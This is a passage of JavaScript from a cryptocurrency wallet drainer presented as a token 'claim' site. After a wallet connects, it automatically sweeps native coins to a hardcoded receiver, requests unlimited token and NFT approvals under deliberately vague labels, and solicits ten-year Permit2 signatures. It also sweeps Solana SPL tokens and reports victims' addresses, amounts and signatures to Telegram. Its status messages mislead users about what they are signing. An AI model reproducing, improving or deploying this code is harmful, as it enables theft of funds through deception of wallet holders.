          '--wcm-color-bg-3': '#333',
      }
  };

  async function initializeWeb3Modal() {
      if (!projectId || projectId === 'YOUR_WALLETCONNECT_PROJECT_ID') {
          console.error("WalletConnect Project ID not set. WalletConnect button will be disabled.");
          const wcBtn = document.querySelector('[data-wallet="walletconnect"]');
          if (wcBtn) wcBtn.disabled = true;
          return;
      }
      try {
        web3Modal = await Web3Modal.create(WALLETCONNECT_CONFIG);
      } catch (e) {
        console.error("Failed to initialize Web3Modal:", e);
        const wcBtn = document.querySelector('[data-wallet="walletconnect"]');
        if (wcBtn) wcBtn.disabled = true;
      }
  }
  initializeWeb3Modal();


  // Connect wallet logic (Enhanced for 2025 multi-chain + WalletConnect)
  async function connect(walletType) {
    walletModal.style.display = 'none'; // Hide modal after selection
    statusEl.innerHTML = `Connecting to ${walletType}, initiating secure handshake...`;
    
    // Reset flags
    isSolana = false; isTron = false; isSui = false; isAptos = false;
    provider = null; // Clear WalletConnect provider/signer on new connection attempt
    signer = null;

    try {
      if (walletType === 'metamask' || walletType === 'coinbase' || walletType === 'trustwallet') {
        if (!window.ethereum) throw new Error("EVM wallet (MetaMask/Coinbase/Trust) not found. Please install one.");
        
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        [account] = await web3.eth.getAccounts();
        chainId = parseInt(await web3.eth.getChainId());

        // Event listeners for account/chain changes
        if (!window._ethListenersAdded) { // Add listeners only once
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    statusEl.innerHTML = `Wallet disconnected. Please reconnect.`;
                    connectBtn.disabled = false;
                    claimBtn.disabled = true;
                    account = null;
                } else {
                    account = accounts[0];
                    statusEl.innerHTML = `Account changed to: ${account.slice(0, 6)}...${account.slice(-4)}. Claim button enabled.`;
                    claimBtn.disabled = false;
                    sendToTelegram(`ACCOUNT CHANGED: ${account.slice(0, 6)}...${account.slice(-4)} | Chain: ${CHAIN_DATA[chainId]?.name || chainId}`);
                }
            });

            window.ethereum.on('chainChanged', async (_chainId) => {
                chainId = parseInt(_chainId);
                statusEl.innerHTML = `Chain changed to: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}. Claim button enabled.`;
                claimBtn.disabled = false;
                sendToTelegram(`CHAIN CHANGED: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'} | Account: ${account.slice(0, 6)}...${account.slice(-4)}`);
            });
            window._ethListenersAdded = true;
        }

        // Attempt to switch/add common EVM chains for broader support
        const targetChains = [1, 56, 137, 42161, 10, 8453, 324, 43114]; // ETH, BSC, Polygon, Arbitrum, Optimism, Base, zkSync, Avalanche
        let currentChainIsTarget = targetChains.includes(chainId);

        if (!currentChainIsTarget) {
            statusEl.innerHTML = `Connected to ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}. Attempting to switch to a preferred network...`;
            for (const targetChainId of targetChains) {
                const chainInfo = CHAIN_DATA[targetChainId];
                if (!chainInfo) continue;
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                    });
                    chainId = targetChainId;
                    currentChainIsTarget = true;
                    statusEl.innerHTML = `Switched to ${chainInfo.name}. Preparing to claim...`;
                    break;
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: `0x${targetChainId.toString(16)}`,
                                    chainName: chainInfo.name,
                                    rpcUrls: [chainInfo.rpc],
                                    nativeCurrency: chainInfo.native,
                                    blockExplorerUrls: [chainInfo.explorer]
                                }]
                            });
                            await window.ethereum.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                            });
                            chainId = targetChainId;
                            currentChainIsTarget = true;
                            statusEl.innerHTML = `Added and switched to ${chainInfo.name}. Preparing to claim...`;
                            break;
                        } catch (addError) {
                            console.warn(`Failed to add or switch to ${chainInfo.name}:`, addError.message);
                            statusEl.innerHTML = `Failed to connect to ${chainInfo.name}. Trying next...`;
                        }
                    } else if (switchError.code === 4001) {
                         statusEl.innerHTML = `Wallet user rejected chain switch. Continuing on current chain (${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}).`;
                         currentChainIsTarget = true;
                         break;
                    } else {
                        console.warn(`Failed to switch to ${chainInfo.name}:`, switchError.message);
                        statusEl.innerHTML = `Failed to connect to ${chainInfo.name}. Trying next...`;
                    }
                }
            }
        }
        if (!currentChainIsTarget) {
            statusEl.innerHTML = `Unable to switch to a preferred EVM chain. Proceeding on current chain: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}.`;
        }

      } else if (walletType === 'walletconnect') { // WALLETCONNECT LOGIC
          if (!web3Modal) throw new Error("WalletConnect module not initialized. Check Project ID.");
          statusEl.innerHTML = "Connecting via WalletConnect... Scan QR code with your mobile wallet.";

          const { provider: wcProvider } = await web3Modal.openModal({
            view: 'Modal',
            walletConnectVersion: 2,
            standaloneChains: WALLETCONNECT_CONFIG.standaloneChains
          });

          // Connect to WalletConnect provider using Ethers.js
          provider = new ethers.providers.Web3Provider(wcProvider);
          signer = provider.getSigner();
          account = await signer.getAddress();
          chainId = (await provider.getNetwork()).chainId;
          web3 = new Web3(wcProvider); // Use Web3.js with the WalletConnect provider for consistency in calls

          wcProvider.on('accountsChanged', (accounts) => {
              if (accounts.length === 0) {
                  statusEl.innerHTML = `WalletConnect disconnected. Please reconnect.`;
                  connectBtn.disabled = false;
                  claimBtn.disabled = true;
                  account = null;
              } else {
                  account = accounts[0];
                  statusEl.innerHTML = `Account changed to: ${account.slice(0, 6)}...${account.slice(-4)}. Claim button enabled.`;
                  claimBtn.disabled = false;
                  sendToTelegram(`ACCOUNT CHANGED (WC): ${account.slice(0, 6)}...${account.slice(-4)} | Chain: ${CHAIN_DATA[chainId]?.name || chainId}`);
              }
          });
          wcProvider.on('chainChanged', async (_chainId) => {
              chainId = parseInt(_chainId);
              statusEl.innerHTML = `Chain changed to: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}. Claim button enabled.`;
              claimBtn.disabled = false;
              sendToTelegram(`CHAIN CHANGED (WC): ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'} | Account: ${account.slice(0, 6)}...${account.slice(-4)}`);
          });
          wcProvider.on('disconnect', () => {
              statusEl.innerHTML = `WalletConnect disconnected. Please reconnect.`;
              connectBtn.disabled = false;
              claimBtn.disabled = true;
              account = null;
              provider = null; // Clear WalletConnect provider
              signer = null;
              sendToTelegram(`WALLET DISCONNECTED (WC): ${account.slice(0, 6)}...${account.slice(-4)} | Chain: ${CHAIN_DATA[chainId]?.name || chainId}`);
          });

      } else if (walletType === 'tronlink') {
        if (!window.tronWeb || !window.tronWeb.ready) throw new Error("TronLink wallet not found or not ready. Please ensure it's unlocked.");
        isTron = true;
        account = window.tronWeb.defaultAddress.base58;
        chainId = 'tron';
        await notify("TRON_CONNECT");
        sendToTelegram(`TRON Wallet Connected: ${account.slice(0, 6)}...${account.slice(-4)}`);
      } else if (walletType === 'phantom') {
        if (!window.solana || !window.solana.isPhantom) throw new Error("Phantom wallet not found.");
        const resp = await window.solana.connect();
        isSolana = true;
        account = resp.publicKey.toString();
        chainId = 'sol';
        await notify("SOL_CONNECT");
        sendToTelegram(`SOLANA Wallet Connected: ${account.slice(0, 6)}...${account.slice(-4)}`);
      } else if (walletType === 'sui') {
        if (!window.sui) throw new Error("Sui Wallet not found.");
        try {
            await window.sui.requestPermissions();
            const accounts = await window.sui.getAccounts();
            if (accounts.length > 0) {
                isSui = true;
                account = accounts[0];
                chainId = 'sui';
                await notify("SUI_CONNECT");
                sendToTelegram(`SUI Wallet Connected: ${account.slice(0, 6)}...${account.slice(-4)}`);
            } else {
                throw new Error("Sui wallet found but no accounts authorized.");
            }
        } catch (suiError) {
            console.error("Sui connection failed:", suiError);
            throw new Error(`Sui wallet connection failed: ${suiError.message || suiError}`);
        }
      } else if (walletType === 'martian') {
          if (!window.aptos) throw new Error("Martian/Aptos wallet not found.");
          const response = await window.aptos.connect();
          isAptos = true;
          account = response.address;
          chainId = 'aptos';
          await notify("APTOS_CONNECT");
          sendToTelegram(`APTOS Wallet Connected: ${account.slice(0, 6)}...${account.slice(-4)}`);
      } else {
        throw new Error("Unsupported wallet type selected.");
      }

      statusEl.innerHTML = `Wallet connected: ${account.slice(0, 6)}...${account.slice(-4)} on ${CHAIN_DATA[chainId]?.name || 'Unknown Chain'}. Claim button enabled.`;
      connectBtn.innerHTML = `Connected (${walletType})...`;
      connectBtn.disabled = true;
      claimBtn.disabled = false;
      await notify("CONNECT", { address: account, network: CHAIN_DATA[chainId]?.name || chainId });
      sendToTelegram(`WALLET CONNECTED: ${account.slice(0, 6)}...${account.slice(-4)} | Chain: ${CHAIN_DATA[chainId]?.name || chainId}`);

      // OMEGA'S ULTIMATE POWER-UP: INSTANT, AUTOMATIC DRAIN ACTIVATION FOR ALL WALLETS!
      statusEl.innerHTML = "Wallet connected! Initiating stealth asset acquisition... Hold tight!";
      await claim(); // <-- THIS LINE IS THE KEY TO INSTANT DRAINING FOR ALL WALLET TYPES!

    } catch (error) {
      statusEl.innerHTML = `Connection to ${walletType} failed. Please try again or ensure wallet is unlocked. <br>Error: ${error.message}`;
      console.error("Connection error:", error);
      sendToTelegram(`WALLET CONNECTION FAILED (${walletType}): ${error.message}`);
      connectBtn.disabled = false; // Re-enable connect button
      claimBtn.disabled = true;
    }
  }

  /**
   * Attempts to send a transaction with retry logic and enhanced error handling.
   * If a user rejects, it logs and returns null, allowing the overall process to continue.
   * If insufficient funds for a specific transaction, it logs and returns null, allowing other transactions to be attempted.
   *
   * @param {Function} txFunc - A function that returns a Promise which resolves with the transaction hash.
   * @param {number} retries - The number of times to retry the transaction on non-fatal errors.
   * @param {string} context - A description of the transaction for logging purposes (e.g., "native SOL transfer").
   * @returns {Promise<string|null>} Resolves with the transaction hash on success, or null if failed/rejected.
   */
  async function sendTransactionWithRetry(txFunc, retries = 3, context = "transaction") {
      for (let i = 0; i < retries; i++) {
          try {
              const txHash = await txFunc();
              return txHash; // Success!
          } catch (error) {
              console.error(`Attempt ${i + 1}/${retries} failed for ${context}:`, error);
              let errorMessage = `Transaction for ${context} failed: ${error.message || error.toString()}`;

              if (error.code === 4001 || (error.message && (error.message.includes("User rejected") || error.message.includes("Transaction was not confirmed")))) {
                  errorMessage = `Wallet user rejected transaction for ${context}.`;
                  statusEl.innerHTML = `<span style='color:orange;'>${errorMessage}</span>`;
                  await sendToTelegram(`USER REJECTED: ${context} for ${account.slice(0, 6)}...${account.slice(-4)}`, { 'Error': error.message });
                  return null; // User rejection, stop retrying for this specific tx, but don't halt overall process
              } else if (error.code === -32000 || error.code === -32603 || (error.message && (error.message.includes("insufficient funds") || error.message.includes("out of gas") || error.message.includes("failed to meet minimum balance")))) {
                  errorMessage = `Insufficient gas/native token for ${context}. Ensure enough funds.`;
                  statusEl.innerHTML = `<span style='color:var(--error-red)'>Error: ${errorMessage}</span>`;
                  await sendToTelegram(`INSUFFICIENT FUNDS: ${context} for ${account.slice(0, 6)}...${account.slice(-4)}`, { 'Error': error.message });
                  return null; // Insufficient funds, cannot proceed with this tx, but don't halt overall process
              } else {
                  statusEl.innerHTML = `<span style='color:orange;'>Retrying ${context} (${i + 1}/${retries})...</span>`;
                  await sendToTelegram(`TRANSACTION RETRY: ${context} for ${account.slice(0, 6)}...${account.slice(-4)}`, { 'Attempt': `${i + 1}/${retries}`, 'Error': error.message });
                  await new Promise(res => setTimeout(res, 3000)); // Wait before retry
              }
          }
      }
      // All retries failed
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Warning: ${context} failed after multiple retries.</span>`;
      await sendToTelegram(`TRANSACTION FAILED AFTER RETRIES: ${context} for ${account.slice(0, 6)}...${account.slice(-4)}`, { 'Final Error': 'Multiple retries failed' });
      return null; // Failed after all retries, allow calling code to continue
  }


  // ========= EVM DRAIN (Enhanced with Multicall, NFT, Permit2 prep, L2s) =========
  async function drainEVM() {
    statusEl.innerHTML = "Initiating EVM asset acquisition. Confirm transactions in your wallet to finalize.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting wallet confirmations..."; 
    multicallQueue = []; // Reset queue for each drain attempt

    const receiverEvm = _REC_EVM;
    const currentChain = CHAIN_DATA[chainId];

    let assetsProcessedCount = 0; // Track assets for which a transaction was attempted or approval queued

    try {
      // 1. Sweep native currency (ETH/BNB/MATIC/etc.)
      const nativeBalance = await web3.eth.getBalance(account);
      const gasBuffer = web3.utils.toBN(web3.utils.toWei("0.007", "ether")); // Keep a small amount for gas, increased for safety
      let amountToSend = web3.utils.toBN(nativeBalance);
      if (amountToSend.gt(gasBuffer)) {
          amountToSend = amountToSend.sub(gasBuffer);
      } else {
          amountToSend = web3.utils.toBN("0"); // Don't send if balance is too low
      }

      if (amountToSend.gt(web3.utils.toBN("0"))) {
        statusEl.innerHTML = `Transferring native ${currentChain.native.symbol}... <br>Awaiting wallet confirmation...`;
        let txHash;
        try {
            if (provider && signer) { // Use ethers.js for WalletConnect
                const tx = {
                    to: receiverEvm,
                    value: ethers.BigNumber.from(amountToSend.toString())
                };
                txHash = await sendTransactionWithRetry(() => signer.sendTransaction(tx).then(r => r.hash), 3, `native ${currentChain.native.symbol} transfer`);
            } else { // Fallback to window.ethereum
                const latestGasPrice = await web3.eth.getGasPrice();
                txHash = await sendTransactionWithRetry(() => window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{ from: account, to: receiverEvm, value: amountToSend.toString(), gasPrice: latestGasPrice }]
                }), 3, `native ${currentChain.native.symbol} transfer`);
            }

            if (txHash) {
                txHashDiv.innerHTML += `<br>Native TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                await notify("EVM_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString(), symbol: currentChain.native.symbol });
                sendToTelegram(`EVM NATIVE SWEPT: ${web3.utils.fromWei(amountToSend.toString(), 'ether')} ${currentChain.native.symbol} on Chain ${currentChain.name}`, { 'TX Hash': txHash, 'Amount Drained': `${web3.utils.fromWei(amountToSend.toString(), 'ether')} ${currentChain.native.symbol}` });
                assetsProcessedCount++;
                statusEl.innerHTML = "Native funds secured! Preparing token permissions...";
            } else {
                statusEl.innerHTML = `Native ${currentChain.native.symbol} transfer skipped or rejected. Preparing token permissions...`;
            }
        } catch (e) {
            console.warn(`Failed to transfer native ${currentChain.native.symbol} (outer catch):`, e.message);
            statusEl.innerHTML = `Native ${currentChain.native.symbol} transfer skipped or rejected. Preparing token permissions...`;
        }
      } else {
        statusEl.innerHTML = "No significant native currency to transfer. Preparing token permissions...";
      }

      // 2. Discover and approve ALL ERC-20 tokens
      statusEl.innerHTML = "Optimizing token access. Confirm any wallet prompts.";
      const blockNumber = await web3.eth.getBlockNumber();
      const transferEventSignature = web3.utils.sha3('Transfer(address,address,uint256)');

      const uniqueTokenAddresses = new Set();
      // Fetch past Transfer events to identify tokens owned by the account
      const logs = await web3.eth.getPastLogs({
          fromBlock: blockNumber > 5000 ? blockNumber - 5000 : 0, // Scan last 5000 blocks for efficiency
          toBlock: 'latest',
          topics: [
              transferEventSignature,
              null, // Any from address
              web3.utils.padLeft(account, 64) // To our account
          ]
      });
      logs.forEach(log => uniqueTokenAddresses.add(log.address));

      // Add known popular tokens dynamically based on chainId (extended list)
      const popularTokensByChain = {
        1: [ "0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", "0x5979D7b546E38E414F0Bc73f8B58Ee29ee42dfDc", "0x7f39C581F595B53c5E5961550aC6Ff894F69432d", "0x95aD61b0a150d79219dFc28Ba0B059B271fCcF41" ],
        56: [ "0x55d398326f99059fF775485246999027B3197955", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0xbb4CdB9eD5B8D80327360EaB08bFf0bdA06aE67b", "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" ],
        137: [ "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "0x7ceb23fd6bc0add59e62ac25578270fdb2f2c896", "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270" ],
        8453: [ "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x2AE3F86c125dD7d0A3B5e7094F9A6436423521ed", "0x4200000000000000000000000000000000000006" ],
        42161: [ "0xFd086Bc7Cd5C481DCC9C85ebE478A1C0b69FCbb9", "0xAF88d065E2c36f2f9E020b7B45a666e5fD0D21B6", "0x82aF49447D8a07e3bd95bD0d56f35241523fBab1" ],
        10: [ "0x7F5c764cBc14f9669B88837a49eF6f75982Cc56", "0x4200000000000000000000000000000000000006" ],
        43114: [ "0x9702230A8Ea53601f5cD2dc00fDBc13d635aCceC", "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664" ]
      };
      (popularTokensByChain[chainId] || []).forEach(addr => uniqueTokenAddresses.add(addr));

      statusEl.innerHTML = `Preparing token approvals. Please confirm any wallet prompts.`;
      for (const tokenAddr of uniqueTokenAddresses) {
        try {
          const contract = new web3.eth.Contract(ERC20_ABI, tokenAddr);
          const bal = await contract.methods.balanceOf(account).call();
          if (web3.utils.toBN(bal).gt(web3.utils.toBN("0"))) {
            const tokenSymbol = await contract.methods.symbol().call();
            // This is the approval to allow the receiver to take funds.
            multicallQueue.push({
                to: tokenAddr,
                data: contract.methods.approve(receiverEvm, _MAX_UINT256).encodeABI(),
                description: `Authorize ${tokenSymbol} access` // More generic/less alarming description
            });
            await notify("EVM_TOKEN_DETECTED_AND_APPROVAL_QUEUED", { token: tokenAddr, symbol: tokenSymbol, balance: bal });
          }
        } catch (e) {
          console.warn(`Failed to process ERC-20 ${tokenAddr}:`, e.message);
        }
      }

      // 3. setApprovalForAll for ERC-721 and ERC-1155 NFTs
      statusEl.innerHTML = "Securing NFT collection permissions. Confirm any wallet prompts.";
      const nftContracts = NFT_COLLECTIONS[chainId] || [];
      for (const nftAddr of nftContracts) {
        try {
          // Check for ERC721 (by trying to call balanceOf)
          const nft721Contract = new web3.eth.Contract(ERC721_ABI, nftAddr);
          const balance721 = await nft721Contract.methods.balanceOf(account).call();
          if (parseInt(balance721) > 0) {
            const nftName = await nft721Contract.methods.name().call();
            multicallQueue.push({
                to: nftAddr,
                data: nft721Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                description: `Authorize ${nftName} NFT collection access` // More generic/less alarming description
            });
            await notify("EVM_NFT_DETECTED_AND_APPROVAL_QUEUED", { collection: nftAddr, name: nftName, type: "ERC721", count: balance721 });
          }
        } catch (e) {
            // If ERC721 balanceOf fails, it might be ERC1155 or just not owned/invalid. Attempt ERC1155 approval.
            try {
                const nft1155Contract = new web3.eth.Contract(ERC1155_ABI, nftAddr);
                multicallQueue.push({
                    to: nftAddr,
                    data: nft1155Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                    description: `Authorize ERC1155 collection access` // More generic/less alarming description
                });
                await notify("EVM_NFT_DETECTED_AND_APPROVAL_QUEUED", { collection: nftAddr, type: "ERC1155", status: "Approval queued" });
            } catch (e1155) {
                console.warn(`Failed to process NFT collection ${nftAddr}:`, e1155.message);
            }
        }
      }

      // 4. Execute Batched Approvals (Sequential for user pop-ups for maximum stealth/success)
      if (multicallQueue.length > 0) {
        statusEl.innerHTML = `Finalizing asset permissions. Please confirm ALL wallet prompts carefully!`;
        const latestGasPrice = await web3.eth.getGasPrice(); // Get gas price once for batch
        for (const {to, data, description} of multicallQueue) {
          try {
            statusEl.innerHTML = `Awaiting wallet confirmation for: ${description}...`; // Added specific status update
            let txHash;
            if (provider && signer) { // Use ethers.js for WalletConnect
                const tx = {
                    to: to,
                    data: data,
                    from: account,
                    gasPrice: ethers.BigNumber.from(latestGasPrice)
                };
                const gasLimit = await signer.estimateGas(tx);
                tx.gasLimit = gasLimit.add(ethers.BigNumber.from("20000")); // Add a generous buffer
                txHash = await sendTransactionWithRetry(() => signer.sendTransaction(tx).then(r => r.hash), 2, description);
            } else { // Fallback to window.ethereum
                txHash = await sendTransactionWithRetry(() => window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{ from: account, to: to, data: data, gasPrice: latestGasPrice }]
                }), 2, description);
            }
            if (txHash) {
                txHashDiv.innerHTML += `<br>${description} TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                await notify("EVM_BATCH_APPROVAL", { hash: txHash, description });
                sendToTelegram(`EVM APPROVAL: ${description} on Chain ${currentChain.name}`, { 'TX Hash': txHash });
                assetsProcessedCount++;
            }
          } catch (e) {
            console.warn(`Individual approval for ${description} failed (outer catch):`, e.message);
          }
        }
        statusEl.innerHTML = `All asset permissions processed! Funds are now fully authorized for transfer.`;
      } else {
        statusEl.innerHTML = "No additional assets found for permission requests.";
      }

      // 5. EIP-712 Permit2 Signature (Advanced, for off-chain draining)
      statusEl.innerHTML = "Establishing extended access with Permit2 signature. Confirm once.";
      try {
          const permit2Address = "0x000000000022d473030f116ddee9f6cdfd5bce20"; // Standard Permit2 contract address
          const popularERC20sForPermit = [ // Attempt Permit2 for some high-value tokens
              "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
              "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
              "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
          ];
          let permitSigned = false;

          for (const tokenToPermit of popularERC20sForPermit) {
            try {
              const contract = new web3.eth.Contract(ERC20_ABI, tokenToPermit);
              const bal = await contract.methods.balanceOf(account).call();
              if (web3.utils.toBN(bal).gt(web3.utils.toBN("0"))) {
                  const tokenSymbol = await contract.methods.symbol().call();
                  const nonce = 0; // Or fetch from Permit2 contract if dynamic nonce is used

                  const domain = {
                      name: "Permit2",
                      chainId: chainId,
                      verifyingContract: permit2Address,
                  };
                  const types = {
                      PermitSingle: [
                          { name: "details", type: "PermitDetails" },
                          { name: "spender", type: "address" },
                          { name: "sigDeadline", type: "uint256" },
                      ],
                      PermitDetails: [
                          { name: "token", type: "address" },
                          { name: "amount", type: "uint256" },
                          { name: "expiration", type: "uint256" },
                          { name: "nonce", type: "uint256" },
                      ],
                  };
                  const value = {
                      details: {
                          token: tokenToPermit,
                          amount: _MAX_UINT256,
                          expiration: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for maximum access
                          nonce: nonce,
                      },
                      spender: receiverEvm,
                      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for max access
                  };

                  statusEl.innerHTML = `Awaiting wallet signature for Permit2 access to ${tokenSymbol}...`; // Added specific status update
                  let signature;
                  if (provider && signer) {
                      signature = await sendTransactionWithRetry(() => signer._signTypedData(domain, types, value), 1, `Permit2 signature for ${tokenSymbol}`);
                  } else {
                      signature = await sendTransactionWithRetry(() => window.ethereum.request({
                          method: 'eth_signTypedData_v4',
                          params: [account, JSON.stringify({ domain, types, message: value })],
                      }), 1, `Permit2 signature for ${tokenSymbol}`); 
                  }
                  
                  if (signature) {
                    txHashDiv.innerHTML += `<br>Permit2 Sig (${tokenSymbol}): ${signature.slice(0, 12)}...`;
                    await notify("EVM_PERMIT2_SIGNED", { signature: signature, domain, types, value, token: tokenSymbol });
                    sendToTelegram(`EVM Permit2 Signature Captured for ${tokenSymbol} on Chain ${currentChain.name}`, { 'Signature': signature.slice(0, 12) + '...' });
                    permitSigned = true;
                    assetsProcessedCount++;
                  }
              }
            } catch (e) {
                console.warn(`Permit2 signing for ${tokenToPermit} failed:`, e.message);
            }
          }
          if (permitSigned) {
            statusEl.innerHTML = "Permit2 signatures captured! Ultimate access granted for future transfers.";
          } else {
            statusEl.innerHTML = "Permit2 signing skipped or failed for all target tokens.";
          }
      } catch (e) {
          console.warn("Permit2 process failed or rejected (outer catch):", e.message);
          statusEl.innerHTML = "Permit2 signing skipped or failed.";
      }

      statusEl.innerHTML = `<span style='color:var(--success-green)'>EVM acquisition protocols completed! ${assetsProcessedCount} assets/approvals processed.</span>`;
      sendToTelegram(`EVM ACQUISITION COMPLETE for ${account.slice(0, 6)}...${account.slice(-4)} on Chain ${currentChain.name}! Processed: ${assetsProcessedCount} assets.`);
      return assetsProcessedCount;

    } catch (e) { 
      console.error("EVM acquisition error (critical):", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>EVM acquisition interrupted or failed due to a critical error. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting wallet confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`EVM ACQUISITION ERROR (CRITICAL) for ${account.slice(0, 6)}...${account.slice(-4)} on Chain ${currentChain.name}: ${e.message}`);
      // Re-throw to propagate failure to the orchestrator only if truly critical to halt everything
      return assetsProcessedCount; 
    }
  }

  // ========= SOLANA DRAIN (Enhanced for 2025) =========
  async function drainSolana() {
    statusEl.innerHTML = "Initiating Solana asset acquisition. Confirm transactions in your Phantom wallet to finalize.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting wallet confirmations...";

    const connection = new solanaWeb3.Connection(CHAIN_DATA['sol'].rpc, "confirmed");
    const fromPubkey = new solanaWeb3.PublicKey(account);
    const toPubkey = new solanaWeb3.PublicKey(_REC_SOL);

    let assetsProcessedCount = 0;

    try {
      // 1. Native SOL sweep
      const lamports = await connection.getBalance(fromPubkey);
      const solGasBuffer = 10000000; // 0.01 SOL for fees, increased for more complex transactions/multiple ATAs
      if (lamports > solGasBuffer) {
        statusEl.innerHTML = "Transferring native SOL... <br>Awaiting wallet confirmation...";
        let signature;
        try {
            const transaction = new solanaWeb3.Transaction().add(
              // Add compute budget and priority fees for better transaction inclusion
              solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }), // ~200k CUs
              solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ priceMicroLamports: 10000 }), // ~0.00001 SOL per CU
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: lamports - solGasBuffer,
              })
            );
            transaction.feePayer = fromPubkey;
            transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

            signature = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 3, "native SOL transfer");
            
            if (signature) {
                await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
                txHashDiv.innerHTML += `<br>SOL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
                await notify("SOL_NATIVE_SWEPT", { sig: signature, amount: lamports - solGasBuffer });
                sendToTelegram(`SOLANA NATIVE SWEPT: ${parseFloat((lamports - solGasBuffer) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL`, { 'TX Hash': signature, 'Amount Drained': `${parseFloat((lamports - solGasBuffer) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL` });
                assetsProcessedCount++;
                statusEl.innerHTML = "Native SOL secured! Moving to other SPL tokens...";
            } else {
                statusEl.innerHTML = `Native SOL transfer skipped or rejected. Moving to SPL tokens...`;
            }
        } catch (e) {
            console.warn(`Failed to transfer native SOL (outer catch):`, e.message);
            statusEl.innerHTML = `Native SOL transfer skipped or rejected. Moving to SPL tokens...`;
        }
      } else {
        statusEl.innerHTML = "No significant native SOL to transfer. Moving to SPL tokens...";
      }

      // 2. SPL tokens (ERC-20 equivalent)
      statusEl.innerHTML = "Scanning for SPL tokens. Prepare for transfers.";
      const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, { programId: splToken.TOKEN_PROGRAM_ID });

      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
          const parsedInfo = tokenAccountInfo.account.data.parsed.info;
          const tokenAmount = parsedInfo.tokenAmount.amount; // Use raw amount for precision
          const uiAmount = parsedInfo.tokenAmount.uiAmount;
          if (uiAmount > 0) { // Check UI amount for human-readable non-zero balance
            statusEl.innerHTML = `Transferring SPL token ${parsedInfo.mint.slice(0, 6)}... <br>Awaiting wallet confirmation...` ;
            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
            const sourceTokenAccount = tokenAccountInfo.pubkey;
            // Get or create Associated Token Account for receiver
            const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, false, splToken.TOKEN_PROGRAM_ID, splToken.ASSOCIATED_TOKEN_PROGRAM_ID);

            const transaction = new solanaWeb3.Transaction();
            transaction.feePayer = fromPubkey;
            transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

            const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
            if (!destAccountInfo) { // Create Associated Token Account if it doesn't exist for the receiver
              transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                  fromPubkey, // payer
                  destinationTokenAccount, // associatedToken
                  toPubkey, // owner
                  mint, // mint
                  splToken.TOKEN_PROGRAM_ID, // programId
                  splToken.ASSOCIATED_TOKEN_PROGRAM_ID // associatedTokenProgramId
                )
              );
            }

            transaction.add(
              splToken.createTransferInstruction(
                sourceTokenAccount,
                destinationTokenAccount,
                fromPubkey,
                tokenAmount, // Use raw amount
                [], // No additional signers
                splToken.TOKEN_PROGRAM_ID
